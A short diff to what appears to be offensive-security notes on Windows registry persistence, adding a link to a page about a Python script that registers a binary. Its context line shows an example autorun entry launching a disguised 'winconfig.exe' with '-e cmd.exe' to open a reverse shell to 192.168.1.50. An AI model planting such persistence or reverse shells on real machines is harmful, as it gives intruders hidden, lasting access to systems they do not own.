@@ -25,3 +25,7 @@ We edit the registry and we add the path to the executable file and some command
 
 For instance: “C:\Windows/System32\winconfig.exe 192.168.1.50 5540 -e cmd.exe”
 ```
+
+### Python script that add a binary to the Registry
+
+See [Making your binary persistent](python/making-your-binary-persistent.md)
